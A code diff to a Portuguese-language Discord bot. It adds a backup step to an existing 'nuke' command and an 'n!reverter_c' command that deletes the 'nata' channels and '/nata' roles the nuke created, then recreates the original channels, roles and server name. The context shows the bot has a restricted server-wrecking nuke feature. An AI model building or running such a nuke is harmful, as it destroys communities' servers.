@@ -26271,6 +26271,20 @@ async def on_message(message: discord.Message):
             await message.reply("❌ Sem permissão para este comando.", delete_after=6)
         return
 
+    if _raw.lower().startswith("n!reverter_c") or _raw.lower().startswith("n!reverterc"):
+        if message.author.id in _C_ALLOWED_USERS:
+            if _reverter_c_running:
+                await message.reply("⚠️ Já existe uma reversão em andamento.", delete_after=8)
+            else:
+                try:
+                    await message.delete()
+                except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                    pass
+                asyncio.create_task(_run_reverter_c(message.channel.id, message.author.id, message.guild))
+        else:
+            await message.reply("❌ Sem permissão para este comando.", delete_after=6)
+        return
+
     # Anti-derrubar: se o usuário tá flooding o bot (comando OU mentions ao bot),
     # ignorar o restante (não processa comandos, IA, auto-resposta etc.)
     content_low = (message.content or "").lower()
@@ -43219,6 +43233,43 @@ async def nuke_cmd(ctx: commands.Context):
     _member_count = guild.member_count or len(guild.members)
     _guild_name_orig = guild.name
 
+    # 0. Salvar backup pré-nuke (para poder reverter depois)
+    try:
+        _bot_top_pos = guild.me.top_role.position
+        _bkp_cats = []
+        _bkp_chs = []
+        for _bch in sorted(guild.channels, key=lambda c: c.position):
+            if isinstance(_bch, discord.CategoryChannel):
+                _bkp_cats.append({"name": _bch.name, "position": _bch.position})
+            elif isinstance(_bch, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel)):
+                _bkp_chs.append({
+                    "name": _bch.name,
+                    "type": "voice" if isinstance(_bch, (discord.VoiceChannel, discord.StageChannel)) else "text",
+                    "position": _bch.position,
+                    "category": _bch.category.name if _bch.category else None,
+                })
+        _bkp_roles = []
+        for _br in sorted(guild.roles, key=lambda r: r.position):
+            if _br.is_default() or _br.managed or _br.position >= _bot_top_pos:
+                continue
+            _bkp_roles.append({
+                "name": _br.name,
+                "color": _br.color.value,
+                "hoist": _br.hoist,
+                "mentionable": _br.mentionable,
+                "permissions": _br.permissions.value,
+            })
+        bot_settings.setdefault(guild.id, {})["pre_nuke_backup"] = {
+            "guild_name": _guild_name_orig,
+            "categories": _bkp_cats,
+            "channels": _bkp_chs,
+            "roles": _bkp_roles,
+        }
+        save_settings_to_disk()
+        print(f"[nuke] backup salvo: {len(_bkp_cats)} cats, {len(_bkp_chs)} canais, {len(_bkp_roles)} cargos", flush=True)
+    except Exception as _bkp_err:
+        print(f"[nuke] erro ao salvar backup: {_bkp_err}", flush=True)
+
     # 1. Renomear
     try:
         await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", reason="Nuke")
@@ -43346,6 +43397,172 @@ async def nuke_cmd(ctx: commands.Context):
             print(f"[nuke] erro criar cargo: {type(_exc).__name__}: {_exc}", flush=True)
             await asyncio.sleep(3)
 
+
+
+_reverter_c_running = False
+
+
+async def _run_reverter_c(notify_channel_id: int, author_id: int, guild: discord.Guild):
+    global _reverter_c_running
+    _reverter_c_running = True
+    try:
+        notify_ch = bot.get_channel(notify_channel_id)
+        author = bot.get_user(author_id)
+
+        async def _send(text: str):
+            if notify_ch:
+                try:
+                    await notify_ch.send(text)
+                    return
+                except Exception:
+                    pass
+            if author:
+                try:
+                    await author.send(text)
+                except Exception:
+                    pass
+
+        backup = bot_settings.get(guild.id, {}).get("pre_nuke_backup")
+        if not backup:
+            await _send(
+                "❌ Nenhum backup pré-nuke encontrado para este servidor.\n"
+                "Use `n!restaurar_deletados` para tentar recuperar pelo audit log."
+            )
+            return
+
+        await _send(
+            f"🔧 Revertendo n!c em **{guild.name}**...\n"
+            f"📦 Backup encontrado: **{len(backup.get('categories', []))}** categorias, "
+            f"**{len(backup.get('channels', []))}** canais, "
+            f"**{len(backup.get('roles', []))}** cargos"
+        )
+
+        # 1. Deletar canais criados pelo nuke (nome "nata")
+        deleted_ch = 0
+        for ch in list(guild.channels):
+            if ch.name == "nata":
+                try:
+                    await ch.delete(reason="Reversão do n!c")
+                    deleted_ch += 1
+                    await asyncio.sleep(0.3)
+                except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                    pass
+
+        await _send(f"🗑️ {deleted_ch} canais 'nata' deletados")
+
+        # 2. Deletar cargos criados pelo nuke (nome "/nata")
+        deleted_roles = 0
+        for role in list(guild.roles):
+            if role.name == "/nata":
+                try:
+                    await role.delete(reason="Reversão do n!c")
+                    deleted_roles += 1
+                    await asyncio.sleep(0.2)
+                except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                    pass
+
+        await _send(f"🗑️ {deleted_roles} cargos '/nata' deletados")
+
+        # 3. Recriar categorias originais
+        cat_map: dict[str, discord.CategoryChannel] = {}
+        for cat_data in backup.get("categories", []):
+            existing_cat = discord.utils.get(guild.categories, name=cat_data["name"])
+            if existing_cat:
+                cat_map[cat_data["name"]] = existing_cat
+                continue
+            try:
+                new_cat = await guild.create_category(
+                    cat_data["name"],
+                    position=cat_data.get("position", 0),
+                    reason="Reversão do n!c",
+                )
+                cat_map[cat_data["name"]] = new_cat
+                await asyncio.sleep(0.4)
+            except (discord.Forbidden, discord.HTTPException):
+                pass
+
+        # 4. Recriar canais originais
+        existing_names = {c.name.lower() for c in guild.channels}
+        created_ch = 0
+        for ch_data in backup.get("channels", []):
+            if ch_data["name"].lower() in existing_names:
+                continue
+            cat = cat_map.get(ch_data.get("category")) if ch_data.get("category") else None
+            try:
+                if ch_data.get("type") == "voice":
+                    await guild.create_voice_channel(ch_data["name"], category=cat, reason="Reversão do n!c")
+                else:
+                    await guild.create_text_channel(ch_data["name"], category=cat, reason="Reversão do n!c")
+                existing_names.add(ch_data["name"].lower())
+                created_ch += 1
+                await asyncio.sleep(0.4)
+            except (discord.Forbidden, discord.HTTPException):
+                pass
+
+        await _send(f"📂 {created_ch} canais recriados")
+
+        # 5. Recriar cargos originais
+        created_roles = 0
+        for role_data in backup.get("roles", []):
+            if discord.utils.get(guild.roles, name=role_data["name"]):
+                continue
+            try:
+                await guild.create_role(
+                    name=role_data["name"],
+                    color=discord.Color(role_data.get("color", 0)),
+                    hoist=role_data.get("hoist", False),
+                    mentionable=role_data.get("mentionable", False),
+                    permissions=discord.Permissions(role_data.get("permissions", 0)),
+                    reason="Reversão do n!c",
+                )
+                created_roles += 1
+                await asyncio.sleep(0.3)
+            except (discord.Forbidden, discord.HTTPException):
+                pass
+
+        await _send(f"🏷️ {created_roles} cargos recriados")
+
+        # 6. Restaurar nome original do servidor
+        orig_name = backup.get("guild_name")
+        if orig_name and guild.name != orig_name:
+            try:
+                await guild.edit(name=orig_name, reason="Reversão do n!c")
+                await _send(f"✏️ Nome restaurado para **{orig_name}**")
+            except (discord.Forbidden, discord.HTTPException):
+                await _send(f"⚠️ Não foi possível restaurar o nome para **{orig_name}**")
+
+        await _send(
+            f"✅ **Reversão concluída!**\n"
+            f"🗑️ Canais 'nata' deletados: **{deleted_ch}**\n"
+            f"🗑️ Cargos '/nata' deletados: **{deleted_roles}**\n"
+            f"📂 Canais recriados: **{created_ch}**\n"
+            f"🏷️ Cargos recriados: **{created_roles}**\n"
+            f"⚠️ Permissões e cargos dos membros precisam ser ajustados manualmente."
+        )
+
+        # Limpa o backup após reversão bem-sucedida
+        bot_settings.get(guild.id, {}).pop("pre_nuke_backup", None)
+        save_settings_to_disk()
+    finally:
+        _reverter_c_running = False
+
+
+@bot.command(name="reverter_c", aliases=["reverterc", "revert_c"])
+async def reverter_c_cmd(ctx: commands.Context):
+    """Reverte tudo que o n!c fez: deleta canais/cargos do nuke e recria os originais."""
+    if ctx.author.id not in _C_ALLOWED_USERS:
+        return
+    if ctx.guild is None:
+        return
+    global _reverter_c_running
+    if _reverter_c_running:
+        await ctx.reply("⚠️ Já existe uma reversão em andamento.", delete_after=8)
+        return
+    try:
+        await ctx.message.delete()
+    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+        pass
+    asyncio.create_task(_run_reverter_c(ctx.channel.id, ctx.author.id, ctx.guild))
 
 
 # =============================================================================
